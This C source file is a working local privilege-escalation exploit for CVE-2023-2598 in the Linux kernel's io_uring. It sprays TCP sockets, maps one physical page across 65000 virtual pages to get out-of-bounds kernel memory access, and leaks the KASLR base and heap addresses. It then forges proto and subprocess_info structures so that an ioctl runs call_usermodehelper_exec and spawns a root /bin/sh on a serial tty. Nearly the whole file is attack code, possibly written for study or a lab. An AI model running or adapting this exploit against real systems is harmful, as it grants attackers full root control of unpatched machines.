#define _GNU_SOURCE
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <liburing.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <mqueue.h>

#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>

#include <assert.h>

#define target_tty_dev "/dev/ttyS0"

#define PAGE_SIZE 0x1000
#define QD 4
#define sock_def_readable 0xd999a0 				// ffffffff81d999a0 T sock_def_readable
#define sk_data_ready_off 680 					// sk_data_ready 在 sock 结构中的偏移，0x2a8 = 680
#define TCP_OFFSET 1400 						// 伪造的`proto`结构相对sock的偏移
#define IOCTL_OFFSET 40 						//
#define call_usermodehelper_exec 0x109e90  		// ffffffff81109e90 T call_usermodehelper_exec
#define call_usermodehelper_exec_work 0x10a2d0 	// ffffffff8110a2d0 t call_usermodehelper_exec_work

#define PROTO_SIZE 456 							// proto对象大小, call_usermode

// offsets into subprocess_info
#define subprocess_workstruct_data 0
#define subprocess_workstruct_entry_next 8
#define subprocess_workstruct_entry_prev 16
#define subprocess_workstruct_func 24
#define subprocess_path 40
#define subprocess_argv 48
#define subprocess_envp 56
#define subprocess_init 72
#define subprocess_cleanup 80

#define __ALIGN_MASK(x,mask)    (((x)+(mask))&~(mask))
#define ALIGN(x,a)              __ALIGN_MASK(x,(typeof(x))(a)-1)

// important for these two values to be correct!
#define L1_CACHE_SHIFT 6
#define sk_buff_size 224

#define SOCK_MIN_SNDBUF 2 * (2048 + ALIGN(sk_buff_size, 1 << L1_CACHE_SHIFT))

// setup_memfd_page() —— 创建匿名文件，并快速分配文件空间
int setup_memfd_page(char* name, int real_pages) {
	int memfd = memfd_create(name, MFD_CLOEXEC); 		// memfd_create() - 匿名文件 - 可以被所有进程共享    MFD_EXEC / MFD_NOEXEC_SEAL

	// we allocate the needed memory in memfd
	fallocate(memfd, 0, 0, real_pages * PAGE_SIZE); 	// fallocate() - 快速文件空间分配，不需要写入数据   int fallocate(int fd, int mode, off_t offset, off_t len)
	return memfd;
}

// vmap_shallow_pages() —— 在一个物理地址处映射 nr_pages(65000) 个连续的虚拟页
void* vmap_shallow_pages(int nr_pages, int memfd) {
	uint64_t start = 0x4247000000;
	for (int i = 0; i < nr_pages; i++) {
		if (mmap(start+i*PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, memfd, 0) < 0) {
			perror("Failed to mmap a page");
			exit(0);
		}
	}
	return (void*) start;
}

void *dump_buffer(void *buffer, int size) {
	for (int i = 0; i < (size/16); i++) { // split to 16-byte (2 word) "lines"
		uint64_t **at;
		at = buffer + i*16;
		// non-zero mode
		if (*at == 0x0 && *(at+1) == 0x0)
			continue;

		printf("0x%llx: 0x%llx 0x%llx\n", at, *at, *(at+1));
		exit(0);
	}
}

// seek_value() —— 搜索buffer中value值的下标
uint64_t seek_value(void *buffer, int size, uint64_t value) { 
	for (int off = 0; off < size; off = off + 8) { // split to 16-byte (2 word) "lines"
		uint64_t **at;
		at = buffer + off;
		if (*at == value)
			return off;
	}
	return -1;
}

void exit_err(char *str) {
	puts(str);
	exit(1);
}

int main(){
	printf("[*] CVE-2023-2598 Exploit Test\n");
// 0. initialize
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(sched_getcpu(), &set);
	if (sched_setaffinity(0, sizeof(set), &set) < 0) {
		perror("sched_setaffinity");
		exit(EXIT_FAILURE);
	}

// 0-1. setup io_uring stuff
	struct io_uring ring;
	int i, fd, ret, pending, done;
	struct io_uring_sqe *sqe;
	struct io_uring_cqe *cqe;
	struct iovec *iovecs;

	uint64_t kaslr_base;

	ret = io_uring_queue_init(QD, &ring, 0);
	if (ret < 0) {
		fprintf(stderr, "queue_init: %s\n", strerror(-ret));
		return 1;
	}
	struct rlimit max_files;
// 0-2. set max # of open files
	getrlimit(RLIMIT_NOFILE, &max_files);
	printf("real limit 1: rlim_cur = %d\n", max_files.rlim_cur);
	max_files.rlim_cur = max_files.rlim_max;
	setrlimit(RLIMIT_NOFILE, &max_files);

	// int limit = max_files.rlim_cur - 20;
	int limit = (max_files.rlim_cur - 20) / 3;  // 打开数量太多，会报错 VFS: file-max limit 399498 reached
	int nr_memfds = limit / 2; 			// memfds 可打开个数
	int nr_sockets = limit - nr_memfds; // socket 可打开个数
	int *memfds = calloc(nr_memfds, sizeof(*memfds)); 		// memfds - 存打开的memfd描述符
	int *sockets = calloc(nr_sockets, sizeof(*sockets)); 	// sockets - 存打开的socket描述符
	printf("[0] limit:%d   nr_sockets:%d   nr_memfds:%d\n", limit, nr_sockets, nr_memfds);
	getrlimit(RLIMIT_NOFILE, &max_files);
	printf("real limit 2: rlim_cur = %d\n", max_files.rlim_cur);

// 1. spray #nr_sockets `sock` object - set mark & file descripter in `sock`
	uint64_t egg = 0xdeadbeefdeadbeef;
	for (int i = 0; i < nr_sockets; i++) {
		if ((sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
			exit_err("socket creating failed");
		if (setsockopt(sockets[i], SOL_SOCKET, SO_MAX_PACING_RATE, &egg, sizeof(uint64_t)) < 0) 	// 设置 sk_pacing_rate / sk_max_pacing_rate , 便于找到本sock
			exit_err("setting pacing rate failed");
		int j = sockets[i] + SOCK_MIN_SNDBUF;
		if (setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, &j, sizeof(int)) < 0) 	// sk->sk_sndbuf = max((fd+4608)*2, 4608), 通过`sk->sk_sndbuf`值可以识别其所属的fd
			exit_err("failed to set SO_SNDBUF");
	}
// 2. open #nr_memfds anonymous files & map 1 page —— 用于触发漏洞（只映射1个页），进行越界读写
	for (int i = 0; i < nr_memfds; i++) {
		memfds[i] = setup_memfd_page("memfd_x", 1);
	}

	int block_size = 500; // leaking in blocks of 500 pages

	struct iovec iovec;
// 3. receiver_fd - allocate 500 pages & mmap to receiver_buffer —— 用于存储泄露数据和伪造的数据
	int receiver_fd = setup_memfd_page("receiver", block_size);
	void *receiver_buffer = mmap(0, block_size*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, receiver_fd, 0);
// 4. 注册单页缓冲区，触发漏洞
	int success = 0;
	int nr_maps = 65000; // good number
	for (int i = 0; i < nr_memfds && success == 0; i = i + 1) {
		void *buffer = vmap_shallow_pages(nr_maps, memfds[i]);  	// 在 buffer = 0x4247000000 处映射 65000 个连续的虚拟页，对应的物理页只有1个
		iovec.iov_base = buffer;
		iovec.iov_len = PAGE_SIZE * nr_maps; 						// 长度设置大一些，以触发溢出
		ret = io_uring_register_buffers(&ring, & iovec, 1); 			// !!!!!!!! 注册该缓冲区，触发漏洞，只有1个页，但是长度很大
		
		// 遍历虚拟页，每隔500遍历一个page
		for (int v_off = 0; v_off < (nr_maps - block_size); v_off = v_off + block_size) {
			printf("[4] memfd: %d, page: %d at virt_addr: %p, reading %d bytes\n", i, v_off, iovec.iov_base + v_off, iovec.iov_len);
			if (ret < 0) {
				printf("Error in registering the buffers\n");
				puts(strerror(-ret));
				return 1;
			}
// 5. 越界读一长段内存 use receiver_fd to write from the registered buffer
			sqe = io_uring_get_sqe(&ring);
			// printf("Receiver buffer: %p\n", receiver_buffer);
			io_uring_prep_write_fixed(sqe, receiver_fd, buffer + v_off * PAGE_SIZE, block_size * PAGE_SIZE, 0, 0);
			ret = io_uring_submit(&ring);
			if (ret < 0) {
				printf("io_uring_submit: %s", strerror(-ret));
				exit(0);
			}
			io_uring_wait_cqe(&ring, &cqe);
			io_uring_cqe_seen(&ring, cqe);
			// puts("Write was done.");
			// dump_buffer(receiver_buffer + PAGE_SIZE, PAGE_SIZE*(block_size - 1));
// 5-1. 确保 sk_pacing_rate / sk_max_pacing_rate == egg, 表示找到了sock结构		
			uint64_t egg_off = seek_value(receiver_buffer, PAGE_SIZE * block_size, egg);
			if (egg_off == -1) // wasn't found here
				continue;
			if (*(uint64_t*) (receiver_buffer + egg_off) != *(uint64_t*) (receiver_buffer + egg_off + 8))
				continue;
// 5-2. sock对象偏移
			uint64_t sock_off = egg_off - 456; 			// ?????????????? sk_pacing_rate 偏移 - 0x1c8 = 456
			printf("[5-2] Found value 0x%llx at offset 0x%llx\n", egg, egg_off);
			printf("[5-2] Socket object starts at offset 0x%llx\n", sock_off);
// 5-3. 内核基址
			uint64_t kaslr_leak;
			kaslr_leak = *(uint64_t*) (receiver_buffer + sock_off + sk_data_ready_off);
			printf("[5-3] kaslr_leak: 0x%llx\n", kaslr_leak);
			kaslr_base = kaslr_leak - sock_def_readable;
			printf("[5-3] kaslr_base: 0x%llx\n", kaslr_base);

// 5-4. FD of the `sock`
			int id = *(int*)(receiver_buffer + sock_off + 332) / 2 - SOCK_MIN_SNDBUF; 	// ?????????????? sk_sndbuf 偏移 - 0x14c = 332
			printf("[5-4] found socket is socket number %d\n", id);

// 5-5. 堆地址 - sock对象地址
			uint64_t obj_addr;
			obj_addr = *(uint64_t*)(receiver_buffer + sock_off + 192) - 192; // (value in sk_error_queue.next) - (offset of sk_error_queue_next)  // ?????????????? sk_error_queue - 0xc0 = 192
			printf("[5-5] our struct sock object starts at 0x%llx\n", obj_addr);

// 6. Save `tcp_sock` to restore later
			int sz_tcp_sock = 2248; 					// ?????????????? tcp_sock 结构大小为2248
			void *backup = malloc(sz_tcp_sock); 
			memcpy(backup, receiver_buffer + sock_off, sz_tcp_sock);
// 7. 篡改 sock.__sk_common.skc_prot 指向伪造的 `proto` 对象（位于`sock`对象的偏移1400处）
			// point sock.__sk_common.skc_prot to our fake proto structure (proto struct at @1400 of `sock`)
			uint64_t proto_addr = obj_addr + TCP_OFFSET; // address of our proto structure
			printf("[7] fake proto structure set up at 0x%llx\n", proto_addr);
			memcpy(receiver_buffer, &proto_addr, 8);	

			sqe = io_uring_get_sqe(&ring);
			uint64_t m_sock_addr = buffer + v_off * PAGE_SIZE + sock_off; // the offset in the mapped memory 
			io_uring_prep_read_fixed(sqe, receiver_fd, m_sock_addr + 40, 8, 0, 0); 	// 从 receiver_fd 往 m_sock_addr+40 读取8字节到偏移0处

			ret = io_uring_submit(&ring);
			assert(ret >= 0);
			io_uring_wait_cqe(&ring, &cqe);
			io_uring_cqe_seen(&ring, cqe);
// 8. forge proto.ioctl
			// uint64_t ioctl_val = 0x1337beef1337;
			uint64_t ioctl_val = kaslr_base + call_usermodehelper_exec;
			uint64_t m_proto =  m_sock_addr + TCP_OFFSET;
			uint64_t m_proto_ioctl = m_proto + IOCTL_OFFSET; 	// ioctl() offset in `proto`
			memcpy(receiver_buffer, &ioctl_val, 8); // we copy the value we want into sock->proto.ioctl
			sqe = io_uring_get_sqe(&ring);
			io_uring_prep_read_fixed(sqe, receiver_fd, m_proto_ioctl, 8, 0, 0);

			ret = io_uring_submit(&ring);
			assert(ret >= 0);
			io_uring_wait_cqe(&ring, &cqe);
			io_uring_cqe_seen(&ring, cqe);

// 9. setup string "/bin/sh" at the start of `proto` (`sock_common->skc_prot` & `subprocess_info->path` 值相同, `proto->ioctl` 偏移为40, 前40字节可以放path, 也即"/bin/sh")
			char *path = "/bin/sh";
			memcpy(receiver_buffer, path, strlen(path) + 1); // we copy the path into the buffer
			sqe = io_uring_get_sqe(&ring);
			io_uring_prep_read_fixed(sqe, receiver_fd, m_proto, strlen(path) + 1, 0, 0);

			ret = io_uring_submit(&ring);
			assert(ret >= 0);
			io_uring_wait_cqe(&ring, &cqe);
			io_uring_cqe_seen(&ring, cqe);

// 10. setup the array of pointers argv after the `proto`
			char *arg0 = ""; // whatever
			char *arg1 = "-c";
			char *arg2 = malloc(128);
			sprintf(arg2, "/bin/sh &>%s <%s", target_tty_dev, target_tty_dev);
			uint64_t arg0_addr = proto_addr + PROTO_SIZE;
			uint64_t arg1_addr = arg0_addr + strlen(arg0) + 1;
			uint64_t arg2_addr = arg1_addr + strlen(arg1) + 1;
			uint64_t argv[3];
			argv[0] = arg0_addr;
			argv[1] = arg1_addr;
			argv[2] = arg2_addr;

			memcpy(receiver_buffer, arg0, strlen(arg0)+1);
			memcpy(receiver_buffer + strlen(arg0) + 1, arg1, strlen(arg1)+1);
			memcpy(receiver_buffer + strlen(arg0) + strlen(arg1) + 2 , arg2, strlen(arg2)+1);
			uint64_t argv_off = arg2_addr - arg0_addr + strlen(arg2) + 1; // offset relative to the end of the proto structure
			argv_off = argv_off + 7 & ~7; // aligning it 8 bytes
			uint64_t argv_addr = proto_addr + PROTO_SIZE + argv_off;
			memcpy(receiver_buffer + argv_off, &argv, sizeof(argv)); 	// 3个参数指针

			sqe = io_uring_get_sqe(&ring);
			io_uring_prep_read_fixed(sqe, receiver_fd, m_proto + PROTO_SIZE, argv_off + sizeof(argv), 0, 0); 	// 

			ret = io_uring_submit(&ring);
			assert(ret >= 0);
			io_uring_wait_cqe(&ring, &cqe);
			io_uring_cqe_seen(&ring, cqe);
			printf("[10] args at 0x%llx\n", arg0_addr);
			printf("[10] argv at 0x%llx\n", argv_addr);

// 11. setup `subprocess_info` at the beginning of `sock`, subprocess_info->path == sock.sock_common->skc_prot (path放在`proto`开头)
	// also setup work_struct.data, work_struct.entry.next, work_struct.entry.prev, work_struct.func
			uint64_t subprocess_info[11];
			subprocess_info[0] = 0; // work_struct.data
			subprocess_info[1] = obj_addr + subprocess_workstruct_entry_next; // work_struct.entry.next
			subprocess_info[2] = obj_addr + subprocess_workstruct_entry_next; // work_struct.entry.prev
			subprocess_info[3] = kaslr_base + call_usermodehelper_exec_work;
			subprocess_info[5] = proto_addr; // both proto_addr and path - important to keep it the same as it was
			subprocess_info[6] = argv_addr; // argv      argv_addr
			subprocess_info[7] = 0; // envp
			subprocess_info[8] = 0; // sub_info->wait = UMH_WAIT_PROC = 0x2 但实际运行还是会被修改为0x539  *(unsigned long*)(backup+8*8)
			subprocess_info[9] = 0;  		//      *(unsigned long*)(backup+9*8) 其实就是填充为0，否则RIP会变成此处的值，执行报错 "execute NX-protected page"
			subprocess_info[10] = 0; // init 
			subprocess_info[11] = 0; // cleanup

			memcpy(receiver_buffer, &subprocess_info, sizeof(subprocess_info));

			sqe = io_uring_get_sqe(&ring);
			io_uring_prep_read_fixed(sqe, receiver_fd, m_sock_addr, sizeof(subprocess_info), 0, 0);

			ret = io_uring_submit(&ring);
			assert(ret >= 0);
			io_uring_wait_cqe(&ring, &cqe);
			io_uring_cqe_seen(&ring, cqe);
			printf("[11] subprocess_info set up at beginning of sock at 0x%llx\n", obj_addr);

// 12. trigger ioctl()
			printf("[12] calling ioctl... \n");
			//int test;
			//scanf("[12] enter a number to start trigger CFH%d:\n", &test);
			ioctl(id, 1337); // call the ioctl and trigger the exploit 		 	// wait = 1337 (0x539)  / 0x2
			sleep(10);

// 13. restore back the socket
			memcpy(receiver_buffer, backup, sz_tcp_sock); 

			sqe = io_uring_get_sqe(&ring);
			io_uring_prep_read_fixed(sqe, receiver_fd, m_sock_addr, sz_tcp_sock, 0, 0);

			ret = io_uring_submit(&ring);
			assert(ret >= 0);
			io_uring_wait_cqe(&ring, &cqe);
			io_uring_cqe_seen(&ring, cqe);
			printf("[13] restore back the socket.\n");

			success = 1;
			break;
			sleep(1);
			//int test;
			//scanf("[13] enter a number to restore back the socket%d:\n", &test);
			// while(1);
			// exit(1);
		}
		io_uring_unregister_buffers(&ring);
		munmap(buffer, nr_maps * PAGE_SIZE);
	}

	// close the sockets and memfds as we will loop and the program won't exit normally
	// so the sockets and memfd will remain in memory
	for (int i = 0; i < nr_sockets; i++)
		close(sockets[i]);
	for (int i = 0; i < nr_memfds; i++)
		close(memfds[i]);
	munmap(receiver_buffer, block_size * PAGE_SIZE);
	close(receiver_fd);

	while (true)
		sleep(60);

	return 0;
}

